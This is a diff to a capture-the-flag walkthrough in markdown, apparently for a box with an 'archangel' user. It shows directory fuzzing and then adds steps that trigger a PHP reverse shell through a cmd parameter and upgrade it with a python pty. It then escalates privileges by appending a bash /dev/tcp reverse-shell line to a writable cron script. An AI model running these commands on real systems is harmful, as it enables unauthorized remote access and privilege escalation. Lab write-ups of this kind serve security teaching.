@@ -28,7 +28,7 @@ Okay guys it is about to get really messy in here. Stay frosty.
 So first of all we are going to FUZZ for hidden directories.
 ![](https://i.ibb.co/kQRKnYg/wfuzz.png)
 And we get a hit for **robots.txt**. which when we visit the page looks something like this.
-![](https://i.ibb.co/vv2SyZj/robots.png)
+![](https://i.ibb.co/vv2SyZj/robots.png).
 
 And we can actually see another directory **/test.php**. visit this page and we can view another page with a button.
 ![](https://i.ibb.co/VYM0RyP/control.png)
@@ -74,7 +74,22 @@ We should be able to get a 200 code on our machin e.
 ![](https://i.ibb.co/4jKLJfz/httpserver.png)
 
 next start up a listener on your machine
+Then run **&cmd=php revshell.php**
+going back to our listener we have a shell.
 
+![](https://i.ibb.co/gzQvS34/nc.png)
+
+
+# Switch user.
+
+So next we can get a better shell by using **python3 -c "import pty;pty.spawn('/bin/bash -i')"**
+
+Then we can check out the cron jobs **cat /etc/crontab**
+
+We can actually see that a job runs as archangel every minute. Which we can read and write.
+So we then run **echo "bash -i >& /dev/tcp/ip/1235 0>&1" >> /opt/helloworld.sh**
+
+Then run another listener and wait for a minute. Coffee break.
 
 
 
